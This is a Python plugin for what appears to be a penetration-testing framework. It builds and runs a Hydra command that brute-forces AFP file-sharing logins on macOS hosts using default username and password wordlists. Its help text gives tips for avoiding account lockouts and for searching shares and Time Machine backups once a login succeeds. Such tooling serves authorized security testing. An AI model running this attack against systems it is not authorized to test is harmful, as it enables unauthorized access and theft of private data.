#!/usr/bin/env python3
"""
souleyez.plugins.afp_brute

AFP brute force plugin using Hydra.
Attacks AFP file sharing on macOS systems.
"""

import subprocess
import time
from typing import List

from souleyez.security.validation import ValidationError, validate_target

from .plugin_base import PluginBase

HELP = {
    "name": "AFP Brute — Apple File Sharing Attack",
    "description": (
        "Brute force AFP (Apple Filing Protocol) credentials on macOS.\n\n"
        "AFP uses macOS user credentials. This plugin tests common passwords.\n\n"
        "Quick tips:\n"
        "- AFP uses macOS local accounts\n"
        "- Guest access may be enabled (check with afp enum first)\n"
        "- Use low threads to avoid lockouts\n"
        "- Success gives access to shared folders\n"
    ),
    "usage": "souleyez jobs enqueue afp_brute <target>",
    "examples": [
        "souleyez jobs enqueue afp_brute 192.168.1.100",
        'souleyez jobs enqueue afp_brute 192.168.1.100 --args "-l admin"',
    ],
    "flags": [
        ["-l USER", "Single username to test"],
        ["-L FILE", "Username list file"],
    ],
    "presets": [
        {"name": "Common Users", "args": [], "desc": "Test common macOS usernames"},
        {
            "name": "Single User",
            "args": ["-l", "admin"],
            "desc": "Test single user 'admin'",
        },
    ],
    "help_sections": [
        {
            "title": "What is AFP Brute Force?",
            "color": "cyan",
            "content": [
                (
                    "Overview",
                    [
                        "AFP (Apple Filing Protocol) brute force uses Hydra to test credentials",
                        "Targets macOS file sharing on port 548",
                        "Uses common macOS usernames and passwords by default",
                    ],
                ),
                (
                    "When to Use",
                    [
                        "After discovering AFP service (port 548) with nmap",
                        "When you need to access shared folders on macOS",
                        "To test weak password policies on Apple systems",
                    ],
                ),
            ],
        },
        {
            "title": "Usage & Examples",
            "color": "green",
            "content": [
                (
                    "Basic Usage",
                    [
                        "souleyez jobs enqueue afp_brute 192.168.1.100",
                        "  → Tests common macOS users with common passwords",
                    ],
                ),
                (
                    "Single User Attack",
                    [
                        'souleyez jobs enqueue afp_brute 192.168.1.100 --args "-l admin"',
                        "  → Tests only the 'admin' user",
                    ],
                ),
            ],
        },
        {
            "title": "Tips & Best Practices",
            "color": "yellow",
            "content": [
                (
                    "Attack Tips",
                    [
                        "Run AFP enumeration first to identify valid usernames",
                        "Check if guest access is enabled (no brute force needed)",
                        "Use low thread count (-t 2) to avoid lockouts",
                        "macOS uses local accounts, not domain accounts",
                    ],
                ),
                (
                    "After Success",
                    [
                        "Use AFP to browse shared folders",
                        "Look for sensitive documents and backups",
                        "Time Machine backups may contain full disk images",
                    ],
                ),
            ],
        },
    ],
}


class AFPBrutePlugin(PluginBase):
    name = "AFP Brute"
    tool = "hydra"
    category = "exploitation"
    HELP = HELP

    def _get_wordlist_path(self, filename: str) -> str:
        """Get path to wordlist file."""
        from souleyez.wordlists import resolve_wordlist_path

        return resolve_wordlist_path(f"data/wordlists/{filename}")

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build Hydra command for AFP brute force."""
        args = args or []

        try:
            target = validate_target(target)
        except ValidationError as e:
            if log_path:
                with open(log_path, "w") as f:
                    f.write(f"ERROR: Invalid target: {e}\n")
            return None

        # Check for user specification in args
        has_user = "-l" in args or "-L" in args

        users = self._get_wordlist_path("macos_users.txt")
        passwords = self._get_wordlist_path("top100.txt")

        cmd = ["hydra"]

        if not has_user:
            cmd.extend(["-L", users])

        cmd.extend(args)  # Add any user-specified args
        cmd.extend(
            [
                "-P",
                passwords,
                "-s",
                "548",
                "-t",
                "2",
                "-w",
                "3",
                "-vV",
                "-f",
                target,
                "afp",
            ]
        )

        return {"cmd": cmd, "timeout": 1800}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute AFP brute force."""
        cmd_spec = self.build_command(target, args, label, log_path)
        if cmd_spec is None:
            return 1

        cmd = cmd_spec["cmd"]

        if log_path:
            with open(log_path, "w") as f:
                f.write(f"# AFP Brute Force on {target}\n")
                f.write(f"# Command: {' '.join(cmd)}\n")
                f.write(f"# Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        try:
            with open(log_path, "a") as f:
                result = subprocess.run(
                    cmd, stdout=f, stderr=subprocess.STDOUT, timeout=cmd_spec["timeout"]
                )
            return result.returncode
        except subprocess.TimeoutExpired:
            if log_path:
                with open(log_path, "a") as f:
                    f.write("\n\n# ERROR: Brute force timed out\n")
            return 124
        except Exception as e:
            if log_path:
                with open(log_path, "a") as f:
                    f.write(f"\n\n# ERROR: {e}\n")
            return 1


plugin = AFPBrutePlugin()
